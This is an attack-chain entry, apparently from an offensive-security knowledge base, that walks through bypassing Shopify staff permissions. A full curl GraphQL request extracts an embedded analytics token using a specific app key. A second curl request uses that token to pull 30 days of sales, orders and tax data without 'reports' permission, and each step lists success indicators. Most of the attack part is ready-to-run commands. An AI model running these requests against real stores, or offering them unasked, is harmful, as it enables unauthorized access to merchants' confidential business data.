---
tags:
  - shopify
  - graphql
  - permission-bypass
  - token-extraction
  - information-disclosure
  - analytics
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/graphql-query-extract-analytics-token]]'
  - '[[commands/curl-post-analytics-query]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Extract-Shopify-Analytics-Token-via-GraphQL]]'
  - '[[procedures/Query-Store-Analytics-Data-Using-Extracted-Token]]'
step_count: 2
techniques:
  - '[[Valid Accounts]]'
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T17:28:44.308Z'
description: >-
  A multi-stage attack exploiting Shopify's GraphQL API to bypass permission
  checks, extract an embedded analytics token from an app installation, and use
  it to query sensitive store analytics data without required dashboard or
  reports permissions.
skill_level: intermediate
impact_level: high
id: 56a8d3c4-dd27-42ac-996c-0f9855965f35
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Data from Information Repositories]]'
---
# Bypass Shopify Permissions to Extract Analytics Token and Access Store Reports

Multi-stage attack chain demonstrating a complete attack workflow exploiting Shopify's permission model to gain unauthorized access to sensitive store analytics.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Extract Token via GraphQL] --> B[Query Analytics Endpoint]
    B --> C[Access Sensitive Reports]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- GraphQL client (e.g., curl or Postman)
- HTTP client (e.g., curl)

### Target Environment

- Shopify Admin API (GraphQL endpoint)
- analytics.shopify.com service
- Web platform with access to Shopify staff account

### Initial Access Requirements

- Valid Shopify staff account with 'apps' permission (but lacking 'dashboard' or 'reports' permissions)
- Knowledge of an installed app's API key (e.g., POS app key 'a53cf2ce9b5dabf5dd222b3615c29569')
- Network access to Shopify APIs

## Detailed Attack Procedures

### Step 1: Extract Analytics Token
procedure: [[procedures/Extract-Shopify-Analytics-Token-via-GraphQL]]

**Objective**: Bypass permission checks to query the GraphQL appByKey endpoint and retrieve the legacyEasdkAnalyticsToken from an app installation.

**Instructions**: Authenticate to the Shopify Admin GraphQL API using your staff token. Execute [[commands/graphql-query-extract-analytics-token]] with the target app's API key to fetch the token:

```bash
curl -X POST 'https://your-shop.myshopify.com/admin/api/2023-10/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: your_staff_token' \
  -d '{"operationName":"EmbeddedAppAnalyticsToken","variables":{"apiKey":"a53cf2ce9b5dabf5dd222b3615c29569"},"query":"query EmbeddedAppAnalyticsToken($apiKey:String!){appByKey:appByKey(apiKey:$apiKey){id installation{id legacyEasdkAnalyticsToken typename}}"}'
```

**Expected Output**: JSON response with the app installation data, including the "legacyEasdkAnalyticsToken" field containing the extracted token value.

**Success Indicators**:
- Token value present in response (e.g., a long string like "eyJ...")
- No permission errors in GraphQL response

### Step 2: Access Store Reports
procedure: [[procedures/Query-Store-Analytics-Data-Using-Extracted-Token]]

**Objective**: Use the extracted token to query the analytics.shopify.com endpoint for sensitive store data, such as sales reports over the last 30 days.

**Instructions**: Prepare the SQL-like query for sales metrics. Execute [[commands/curl-post-analytics-query]] by replacing {token_here} with the extracted token:

```bash
curl -X POST 'https://analytics.shopify.com/validate?beta=true&dataOnly=false' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0' \
  -H 'Origin: https://your-shop.myshopify.com/' \
  -d 'q%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day&source=new-admin&token=eyJ...extracted_token_here'
```

**Expected Output**: JSON response containing aggregated analytics data, including daily breakdowns of orders, gross sales, discounts, returns, net sales, shipping, taxes, and total sales.

**Success Indicators**:
- Response includes sales data arrays without authentication errors
- Data covers the specified time period (e.g., last 30 days)

## Attack Chain Summary

### Key Achievements

1. Bypassed Shopify's permission model to extract an analytics token using only 'apps' access.
2. Queried sensitive store reports via analytics.shopify.com without 'reports' permission.
3. Demonstrated unauthorized read access to business-critical data like sales and orders.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Data from Information Repositories]] Data from Information Repositories

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
